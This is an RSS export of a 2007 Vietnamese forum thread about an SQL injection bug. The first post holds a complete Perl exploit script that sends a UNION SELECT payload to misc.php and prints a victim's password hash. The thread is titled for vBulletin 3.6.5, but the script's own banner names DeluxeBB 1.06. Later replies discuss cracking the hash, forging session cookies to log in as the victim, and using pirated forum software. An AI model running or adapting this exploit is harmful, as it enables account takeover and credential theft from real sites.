<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Vbulletin 3.6.5 Sql Injection ! [misc.php]"]]></title>
		<link>http://www.hvaonline.net/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "Vbulletin 3.6.5 Sql Injection ! [misc.php]"]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Có bác nào biết cách sử dụng pws hash không ?

<span class="quotetxt"><b>Code:</b></span><br/>
		<div class="coded"">
		<pre>#!/usr/bin/perl

use IO::Socket;


print q{
#############################################
# DeluxeBB 1.06 Remote SQL Injection Exploit#
# 	exploit discovered and coded        #
#	   by KingOfSka                     #
#	http://contropotere.netsons.org	    #
#############################################
};

if &#40;!$ARGV&#91;2&#93;&#41; {

print q{
 	Usage: perl dbbxpl.pl host /directory/ victim_userid

        perl dbbxpl.pl www.somesite.com /forum/ 1


};

exit&#40;&#41;;

}


$server = $ARGV&#91;0&#93;;
$dir    = $ARGV&#91;1&#93;;
$user   = $ARGV&#91;2&#93;;
$myuser = $ARGV&#91;3&#93;;
$mypass = $ARGV&#91;4&#93;;
$myid   = $ARGV&#91;5&#93;;

print "------------------------------------------------------------------------------------------------\r\n";
print "&#91;&gt;&#93; SERVER: $server\r\n";
print "&#91;&gt;&#93;    DIR: $dir\r\n";
print "&#91;&gt;&#93; USERID: $user\r\n";
print "------------------------------------------------------------------------------------------------\r\n\r\n";

$server =~ s/&#40;http:\/\/&#41;//eg;

$path  = $dir;
$path .= "misc.php?sub=profile&name=0'&#41;+UNION+SELECT+0,pass,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0+FROM%20deluxebb_users%20WHERE%20&#40;uid='".$user ;


print "&#91;~&#93; PREPARE TO CONNECT...\r\n";

$socket = IO::Socket::INET-&gt;new&#40; Proto =&gt; "tcp", PeerAddr =&gt; "$server", PeerPort =&gt; "80"&#41; || die "&#91;-&#93; CONNECTION FAILED";

print "&#91;+&#93; CONNECTED\r\n";
print "&#91;~&#93; SENDING QUERY...\r\n";
print $socket "GET $path HTTP/1.1\r\n";
print $socket "Host: $server\r\n";
print $socket "Accept: */*\r\n";
print $socket "Connection: close\r\n\r\n";
print "&#91;+&#93; DONE!\r\n\r\n";



print "--&#91; REPORT &#93;------------------------------------------------------------------------------------\r\n";
while &#40;$answer = &lt;$socket&gt;&#41;
{

  if &#40;$answer =~/&#40;\w{32}&#41;/&#41;
{

   if &#40;$1 ne 0&#41; {
    print "Password Hash is: ".$1."\r\n";
print "--------------------------------------------------------------------------------------\r\n";

       }
exit&#40;&#41;;
}

}
print "------------------------------------------------------------------------------------------------\r\n";</pre>
		</div>]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#58599</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#58599</link>
				<pubDate><![CDATA[Fri, 11 May 2007 23:20:10]]> GMT</pubDate>
				<author><![CDATA[ hijackvn]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Lỗi này có cách đây &gt; 1 tháng rồi.
Và hầu hết đã FIXX rồi! ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#58653</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#58653</link>
				<pubDate><![CDATA[Sat, 12 May 2007 05:50:06]]> GMT</pubDate>
				<author><![CDATA[ SonNguyen_sn]]></author>
			</item>
			<item>
				<title>Re: Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Lấy pass hash rồi làm gì đây bác?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#58819</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#58819</link>
				<pubDate><![CDATA[Sun, 13 May 2007 00:27:01]]> GMT</pubDate>
				<author><![CDATA[ mechk]]></author>
			</item>
			<item>
				<title>Re: Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Hix, hôm nọ thử cái script này trên vbb 3.6.5 của mình (mình nhớ là chưa patch gì hết) thì nó cũng hiện hashed password đàng hoàng, hóa ra lại không phải password của mình, search thử giá trị đó trong DB thì rốt cuộc chỉ là 1 cái sessionid vừa được tạo, hìhì, may ghê :lol:) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#59274</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#59274</link>
				<pubDate><![CDATA[Tue, 15 May 2007 03:38:30]]> GMT</pubDate>
				<author><![CDATA[ SuperChicken]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Nói vậy nghĩa là ko hiệu wả ah?]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#60160</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#60160</link>
				<pubDate><![CDATA[Fri, 18 May 2007 20:25:24]]> GMT</pubDate>
				<author><![CDATA[ nhimthulinh]]></author>
			</item>
			<item>
				<title>Re: Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Siêu trộm wrote:</cite><br>
		<blockquote>Hix, hôm nọ thử cái script này trên vbb 3.6.5 của mình (mình nhớ là chưa patch gì hết) thì nó cũng hiện hashed password đàng hoàng, hóa ra lại không phải password của mình, search thử giá trị đó trong DB thì rốt cuộc chỉ là 1 cái sessionid vừa được tạo, hìhì, may ghê :lol:) &nbsp;
		</blockquote>
bạn ơi cho  mình hỏi khi có đoạn code trên thì ta sử dụng như thế nào mình chưa hiểu rõ lắm bạn có thể mail cho mình học pm cho mình theo níck chat sau nhe moon_knight2006 và email: moon_knight2006@yahoo.com]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#60165</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#60165</link>
				<pubDate><![CDATA[Fri, 18 May 2007 21:06:56]]> GMT</pubDate>
				<author><![CDATA[ moon_knightvt]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ hix. Pass hash của VBB được mã hóa 2 lần. Dịch bằng password pro nó ghi là &gt;10000 day mới dịch xong. Từ bỏ ý định đó đi ^^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#60195</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#60195</link>
				<pubDate><![CDATA[Sat, 19 May 2007 00:04:02]]> GMT</pubDate>
				<author><![CDATA[ minhquan1712]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Hệ thống của thằng VBB ngày càng hoàn thiện ! nên càng ngày càng khó chơi ! nên tốt nhất bỏ ý định đi :D]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#65302</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#65302</link>
				<pubDate><![CDATA[Sun, 17 Jun 2007 15:04:40]]> GMT</pubDate>
				<author><![CDATA[ YTQ]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Không biết bản mới nhất 3.6.7 có lỗi nào hok nhỉ ??? Chán nhất là thằng VBB bắt phải có license. NULL thì quá chậm để làm 1 forum :L]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#66044</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#66044</link>
				<pubDate><![CDATA[Thu, 21 Jun 2007 12:32:55]]> GMT</pubDate>
				<author><![CDATA[ lequi]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ bản null thì đâu có sao đâu bạn. Trên mạng giờ share cả đống bản VBB đã hack. Xài thoải mái. Giờ muốn hack vbb bản 3.6x trở lên hầu như rất khó, chỉ trừ khi admin bất cẩn thôi^^]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#66941</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#66941</link>
				<pubDate><![CDATA[Mon, 25 Jun 2007 17:24:46]]> GMT</pubDate>
				<author><![CDATA[ minhquan1712]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Cụ thể Passhash của VBB là: md5(md5($pass).$salt)]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#72486</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#72486</link>
				<pubDate><![CDATA[Fri, 20 Jul 2007 00:42:30]]> GMT</pubDate>
				<author><![CDATA[ phstiger]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ Đúng là nên từ bỏ ý định đi, mấy cái pass hash đó chỉ làm đau đầu mà thôi!]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#82874</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#82874</link>
				<pubDate><![CDATA[Sun, 2 Sep 2007 11:58:15]]> GMT</pubDate>
				<author><![CDATA[ kimsonha]]></author>
			</item>
			<item>
				<title>Re: Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ theo mình nghĩ nếu chỉ pwd hash userid thì không có tác dụng. Trong trường hợp này ta phải kết hợp lấy thêm 1 biến nữa là <b>bbsessionhash</b>. Sửa các giá trị cookie (trong firefox) của <b>bbpassword</b>, <b>bbuserid </b>và <b>bbssessionhash</b> thì ta sẽ đăng nhập được vào forum với userid đó. mình suy luận dựa vào cách sử dụng cookie lấy được qua xss nhưng chưa thử (không rõ có lấy được sessionhash không). Để khi nào rảnh sẽ test trên localhost]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#83480</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#83480</link>
				<pubDate><![CDATA[Wed, 5 Sep 2007 13:12:51]]> GMT</pubDate>
				<author><![CDATA[ hijackvn]]></author>
			</item>
			<item>
				<title>Re: Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">Siêu trộm wrote:</cite><br>
		<blockquote>Hix, hôm nọ thử cái script này trên vbb 3.6.5 của mình (mình nhớ là chưa patch gì hết) thì nó cũng hiện hashed password đàng hoàng, hóa ra lại không phải password của mình, search thử giá trị đó trong DB thì rốt cuộc chỉ là 1 cái sessionid vừa được tạo, hìhì, may ghê :lol:) &nbsp;
		</blockquote>
tại sao đoạn code đó chỉ lấy đc cái sessionid nhỉ ? muốn nó show ra passhash thực sự thì phải sửa đoạn code này làm sao ?
<blockquote>while ($answer = &lt;$socket&gt;)
 {
 
   if ($answer =~/(\w{32})/)
 {
 
    if ($1 ne 0) {
     print "Password Hash is: ".$1."\r\n";&nbsp;
		</blockquote>
??? 
ps: điều kiện khai thác thành công thì magic_quote=off nha các đồng chí 
:-o) ]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#83485</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#83485</link>
				<pubDate><![CDATA[Wed, 5 Sep 2007 13:40:06]]> GMT</pubDate>
				<author><![CDATA[ gamma95]]></author>
			</item>
			<item>
				<title>Vbulletin 3.6.5 Sql Injection ! [misc.php]</title>
				<description><![CDATA[ <p></p>
		<cite class="blockquote">phstiger wrote:</cite><br>
		<blockquote>Cụ thể Passhash của VBB là: md5(md5($pass).$salt)&nbsp;
		</blockquote>

Giống của IPB nhỉ :P]]></description>
				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/10222.html#83573</guid>
				<link>http://www.hvaonline.net/hvaonline/posts/list/10222.html#83573</link>
				<pubDate><![CDATA[Wed, 5 Sep 2007 20:18:56]]> GMT</pubDate>
				<author><![CDATA[ KINYO]]></author>
			</item>
	</channel>
</rss>
